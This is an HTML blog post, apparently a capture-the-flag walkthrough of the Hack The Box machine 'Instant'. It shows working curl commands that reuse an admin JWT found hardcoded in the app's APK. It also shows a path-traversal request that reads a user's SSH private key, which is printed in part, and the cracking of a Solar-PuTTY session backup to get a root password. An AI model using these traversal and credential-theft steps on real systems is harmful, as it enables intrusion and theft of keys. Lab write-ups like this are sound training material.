@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Linux - Medium - Instant - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Linux - Medium - Instant</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1728813492762"
+                  >2024-10-13 11:58</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1742156239589"
+                  >2025-03-16 21:17</time
+                ></span
+              >
+            </div>
+            
+            <div>
+              Keywords: 
+              <span class="keyword">api</span>
+              
+              <span class="keyword">jwt</span>
+              
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<p><img src="/_resources/4e40075c260949eca386741700fa4c34.png" /></p>
+<p>Clicking the download button gets us an .apk file. Dirsearch finds some dirs, but we can’t access any of them.</p>
+<p><img src="/_resources/9ad8e9a61b674c22bcbe9c0db359a669.png" /></p>
+<p>All of the subdomains give 301 to the main site, except for swagger-ui.instant.htb, which redirects to /apidocs.</p>
+<h1 id="apk-file">Apk file</h1>
+<p>Let’s get back to the .apk file. We can unzip it. I realized that I dont know what to look for, so started searching for anything for .apk file analysis. After a while I’ve found <a title="https://github.com/MobSF/Mobile-Security-Framework-MobSF" href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">MobSF</a>, which looked pretty good. It decompiled app’s code and allowed me to find the log in mechanism.</p>
+<p><code>http://mywalletv1.instant.htb/api/v1/login</code><br />
+<img src="/_resources/da09035730034e6d9b50d8d10c46eab3.png" /></p>
+<p>We can now test if the api works.</p>
+<div><pre class="hljs"><code><span class="hljs-variable">$curl</span> -X POST http://mywalletv1.instant.htb/api/v1/login \
+    -H <span class="hljs-string">"Content-Type: application/json"</span> \
+    -d <span class="hljs-string">'{"username": "your_username", "password": "your_password"}'</span>
+    
+{<span class="hljs-string">"Description"</span>:<span class="hljs-string">"User Doesn't Exist"</span>,<span class="hljs-string">"Status"</span>:404}</code></pre></div>
+<p>Later, I’ve found “AdminActivities.java” with a nice class in it.</p>
+<div><pre class="hljs"><code><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AdminActivities</span> {
+    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">TestAdminAuthorization</span><span class="hljs-params">()</span> {
+        <span class="hljs-keyword">new</span> <span class="hljs-title class_">OkHttpClient</span>().newCall(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Request</span>.Builder().url(<span class="hljs-string">"http://mywalletv1.instant.htb/api/v1/view/profile"</span>).addHeader(<span class="hljs-string">"Authorization"</span>, <span class="hljs-string">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"</span>).build()).enqueue(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Callback</span>() { <span class="hljs-comment">// from class: com.instantlabs.instant.AdminActivities.1</span>
+            <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-comment">/* synthetic */</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">$assertionsDisabled</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
+            <span class="hljs-meta">@Override</span> <span class="hljs-comment">// okhttp3.Callback</span>
+            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onFailure</span><span class="hljs-params">(Call call, IOException iOException)</span> {
+                System.out.println(<span class="hljs-string">"Error Here : "</span> + iOException.getMessage());
+            }
+            <span class="hljs-meta">@Override</span> <span class="hljs-comment">// okhttp3.Callback</span>
+            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onResponse</span><span class="hljs-params">(Call call, Response response)</span> <span class="hljs-keyword">throws</span> IOException {
+                <span class="hljs-keyword">if</span> (response.isSuccessful()) {
+                    <span class="hljs-keyword">try</span> {
+                        System.out.println(JsonParser.parseString(response.body().string()).getAsJsonObject().get(<span class="hljs-string">"username"</span>).getAsString());
+                    } <span class="hljs-keyword">catch</span> (JsonSyntaxException e) {
+                        System.out.println(<span class="hljs-string">"Error Here : "</span> + e.getMessage());
+                    }
+                }
+            }
+        });
+        <span class="hljs-keyword">return</span> <span class="hljs-string">"Done"</span>;
+    }
+}</code></pre></div>
+<p>We have a <a title="https://en.wikipedia.org/wiki/JSON_Web_Token" href="https://en.wikipedia.org/wiki/JSON_Web_Token">JWT</a> in it, which allows us to log in into the site using curl.</p>
+<p>Running curl without token gets us <code>curl -X GET "http://mywalletv1.instant.htb/api/v1/view/profile" {"Description":"Unauthorized!","Status":401}</code></p>
+<p>Running curl with token gets us:</p>
+<div><pre class="hljs"><code>curl -X GET "http://mywalletv1.instant.htb/api/v1/view/profile" \
+     -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
+<span class="hljs-meta">&lt;!doctype <span class="hljs-keyword">html</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">en</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>500 Internal Server Error<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Internal Server Error<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></code></pre></div>
+<p>So we know we are at least logged in, but something is not working. We need to find a better way of accessing the api. Lets see what are our options by running dirsearch again.</p>
+<div><pre class="hljs"><code>[<span class="hljs-number">21</span>:<span class="hljs-number">42</span>:<span class="hljs-number">36</span>] Starting: api<span class="hljs-regexp">/v1/</span>
+[<span class="hljs-number">21</span>:<span class="hljs-number">42</span>:<span class="hljs-number">57</span>] <span class="hljs-number">405</span> -  <span class="hljs-number">153</span>B  - <span class="hljs-regexp">/api/</span>v1/login
+[<span class="hljs-number">21</span>:<span class="hljs-number">43</span>:<span class="hljs-number">03</span>] <span class="hljs-number">405</span> -  <span class="hljs-number">153</span>B  - <span class="hljs-regexp">/api/</span>v1/register</code></pre></div>
+<h1 id="api">API</h1>
+<p>Running get on /login gets us <code>&lt;p&gt;The method is not allowed for the requested URL.&lt;/p&gt;</code>.<br />
+Running post on /login gets us <code>&lt;p&gt;Did not attempt to load JSON data because the request Content-Type was not &amp;#39;application/json&amp;#39;.&lt;/p&gt;</code>.</p>
+<div><pre class="hljs"><code>curl -X POST <span class="hljs-string">"http://mywalletv1.instant.htb/api/v1/login"</span> \
+     -H <span class="hljs-string">"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"</span> \
+     -H <span class="hljs-string">"Content-Type: application/json"</span> \
+     -d <span class="hljs-string">'{
+           "username": "your_username_here",
+           "password": "your_password_here"
+         }'</span>
+         
+{<span class="hljs-string">"Description"</span>:<span class="hljs-string">"User Doesn't Exist"</span>,<span class="hljs-string">"Status"</span>:404}</code></pre></div>
+<p>Not seeing any way to log in further with this account, I’ve created a new one</p>
+<div><pre class="hljs"><code>curl -X POST <span class="hljs-string">"http://mywalletv1.instant.htb/api/v1/register"</span>      -H <span class="hljs-string">"Content-Type: application/json"</span>      -d <span class="hljs-string">'{
+           "username": "new_username", 
+           "email": "user@example.com", 
+           "password": "secure_password", 
+           "pin": "12345"
+         }'</span>
+         
+{<span class="hljs-string">"Description"</span>:<span class="hljs-string">"User Registered! Login Now!"</span>,<span class="hljs-string">"Status"</span>:201}</code></pre></div>
+<p>Then I’ve menaged to log in to the site and get my access token.</p>
+<div><pre class="hljs"><code>curl -X POST <span class="hljs-string">"http://mywalletv1.instant.htb/api/v1/login"</span> \
+     -H <span class="hljs-string">"Content-Type: application/json"</span> \
+     -d <span class="hljs-string">'{
+           "username": "new_username", 
+           "password": "secure_password"
+         }'</span>
+         
+{<span class="hljs-string">"Access-Token"</span>:<span class="hljs-string">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Mywicm9sZSI6Imluc3RhbnRpYW4iLCJ3YWxJZCI6IjA1N2YxMTBlLTA0ZDEtNGNiYi05Yzk5LTRmNzU3MDZhMjRjMiIsImV4cCI6MTcyODg2MDIyOH0.XYeSjK9JEZFi1d_xwBq1fHa0DZ04TiMt0md5NVsWwAo"</span>,<span class="hljs-string">"Status"</span>:201}</code></pre></div>
+<p>I was stumbling for way too long, until I realized that apidocs site exists under <code>http://swagger-ui.instant.htb/apidocs/</code>. In there I found documentation explaining, how we can read files.</p>
+<p><img src="/_resources/af25ed64da4042baa04ddf00e8cf808f.png" /></p>
+<p>So I added the admin token I have found in an app and it worked!</p>
+<div><pre class="hljs"><code>┌─[user@parrot]─[~]
+└──╼ <span class="hljs-variable">$curl</span> -X GET <span class="hljs-string">"http://swagger-ui.instant.htb/api/v1/admin/view/logs"</span> -H  <span class="hljs-string">"accept: application/json"</span> -H  <span class="hljs-string">"Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"</span>
+
+{<span class="hljs-string">"Files"</span>:[<span class="hljs-string">"1.log"</span>],<span class="hljs-string">"Path"</span>:<span class="hljs-string">"/home/shirohige/logs/"</span>,<span class="hljs-string">"Status"</span>:201}</code></pre></div>
+<p>If we can read any files, then we can probably read private key. It works too!</p>
+<div><pre class="hljs"><code>curl -X GET <span class="hljs-string">"http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2F.ssh%2Fid_rsa"</span> -H  <span class="hljs-string">"accept: application/json"</span> -H  <span class="hljs-string">"Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"</span>
+
+{<span class="hljs-string">"/home/shirohige/logs/../.ssh/id_rsa"</span>:[<span class="hljs-string">"-----BEGIN RSA PRIVATE KEY-----\n"</span>,<span class="hljs-string">"MIIEogIBAAKCAQEA01usoSAQWBBr/ALqnCMjKnefsbyo7gyX0vBQu9BQlpcFUyr4\n"</span>, &lt;SNIP&gt;,<span class="hljs-string">"zvJRbBhLdAhiIbDpvpc9fsbGLaZJZFAzwKjaDJonqTHld+QfYXkZWQVn836xXFE7\n"</span>,<span class="hljs-string">"CZLeDL3JinER4vSPMRo/j0+q7Jd1SSEDsPgk7fYkpq6rmbbv7mDlAE5Mdub6OJvm\n"</span>,<span class="hljs-string">"l1WtAoGAfeQmYcwUN2MHTn3jWmzH5GGFRMioKRueJFmB7C55l0SiFgucO23swZEg\n"</span>,<span class="hljs-string">"Pso/MXcUDTzvBKGm7bkNlfrqWivx2wWlaHU0DorrEH2cE6EJQiXsGkjr2hvXdEGg\n"</span>,<span class="hljs-string">"+8jjYKVcgddAw0xC54C4XSfYaJa96rTUuqaPrL0TRQ5XqB1NLUA=\n"</span>,<span class="hljs-string">"-----END RSA PRIVATE KEY-----\n"</span>],<span class="hljs-string">"Status"</span>:201}</code></pre></div>
+<p>Another problem was that I did not have a user to log in as, but we can read the docs again to list possible log files.</p>
+<div><pre class="hljs"><code>curl -X <span class="hljs-built_in">GET</span> <span class="hljs-string">"http://swagger-ui.instant.htb/api/v1/admin/view/logs"</span> -H  <span class="hljs-string">"accept: application/json"</span> -H  <span class="hljs-string">"Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"</span>
+{<span class="hljs-string">"Files"</span>:[<span class="hljs-string">"1.log"</span>],<span class="hljs-string">"Path"</span>:<span class="hljs-string">"/home/shirohige/logs/"</span>,<span class="hljs-string">"Status"</span>:201}</code></pre></div>
+<p>There it is, time to log in as shirohige. <code>ssh -i key.ssh shirohige@instant.htb</code></p>
+<h1 id="priv-esc">Priv esc</h1>
+<p>After doing a few boxes, I always just go to /opt to see if there is something. No exception this time, we will be attacking Solar-PuTTy this time probably.</p>
+<div><pre class="hljs"><code>shirohige@instant:/opt/backups$ ls
+Solar-PuTTY</code></pre></div>
+<p>In it, we have just a single file called <code>sessions-backup.dat</code>.</p>
+<div><pre class="hljs"><code>shirohige@instant:/opt/backups/Solar-PuTTY$ cat sessions-backup.dat 
+ZJlEkpkqLgj2PlzCyLk4gtCfsGO2CMirJoxxdpclYTlEshKzJwjMCwhDGZzNRr0fNJMlLWfpbdO7l2fEbSl/OzVAmNq0YO94RBxg9p4pwb4upKiVBhRY22HIZFzy6bMUw363zx6lxM4i9kvOB0bNd/4PXn3j3wVMVzpNxuKuSJOvv0fzY/ZjendafYt1Tz1VHbH4aHc8LQvRfW6Rn+5uTQEXyp4jE+ad4DuQk2fbm9oCSIbRO3/OKHKXvpO5Gy7db1njW44Ij44xDgcIlmNNm0m4NIo1Mb/2ZBHw/MsFFoq/TGetjzBZQQ/rM7YQI81SNu9z9VVMe1k7q6rDvpz1Ia7JSe6fRsBugW9D8GomWJNnTst7WUvqwzm29dmj7JQwp+OUpoi/j/HONIn4NenBqPn8kYViYBecNk19Leyg6pUh5RwQw8Bq+6/OHfG8xzbv0NnRxtiaK10KYh++n/Y3kC3t+Im/EWF7sQe/syt6U9q2Igq0qXJBF45Ox6XDu0KmfuAXzKBspkEMHP5MyddIz2eQQxzBznsgmXT1fQQHyB7RDnGUgpfvtCZS8oyVvrrqOyzOYl8f/Ct8iGbv/WO/SOfFqSvPQGBZnqC8Id/enZ1DRp02UdefqBejLW9JvV8gTFj94MZpcCb9H+eqj1FirFyp8w03VHFbcGdP+u915CxGAowDglI0UR3aSgJ1XIz9eT1WdS6EGCovk3na0KCz8ziYMBEl+yvDyIbDvBqmga1F+c2LwnAnVHkFeXVua70A4wtk7R3jn8+7h+3Evjc1vbgmnRjIp2sVxnHfUpLSEq4oGp3QK+AgrWXzfky7CaEEEUqpRB6knL8rZCx+Bvw5uw9u81PAkaI9SlY+60mMflf2r6cGbZsfoHCeDLdBSrRdyGVvAP4oY0LAAvLIlFZEqcuiYUZAEgXgUpTi7UvMVKkHRrjfIKLw0NUQsVY4LVRaa3rOAqUDSiOYn9F+Fau2mpfa3c2BZlBqTfL9YbMQhaaWz6VfzcSEbNTiBsWTTQuWRQpcPmNnoFN2VsqZD7d4ukhtakDHGvnvgr2TpcwiaQjHSwcMUFUawf0Oo2+yV3lwsBIUWvhQw2g=</code></pre></div>
+<p>So simple duckduckgo search for <code>solar-PuTTy getting data from .dat file</code> got me <a title="https://github.com/Vz0n/SolarPuttyBrute" href="https://github.com/Vz0n/SolarPuttyBrute">SolarPuTTYBrute</a>. So I downloaded Visual Studio, compiled it and run with rockyou.txt.</p>
+<p><img src="/_resources/19b075f4bcbf4fb599c1356af8e4c750.png" /></p>
+<p>It worked, tried to log in as root on the linux machine with the pass <code>12**24nzC!r0c%q12</code>.</p>
+<p><img src="/_resources/4f2d1c9a20fb48a397017cf393373c92.png" /></p>
+<p>We are done here. Easy root.</p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
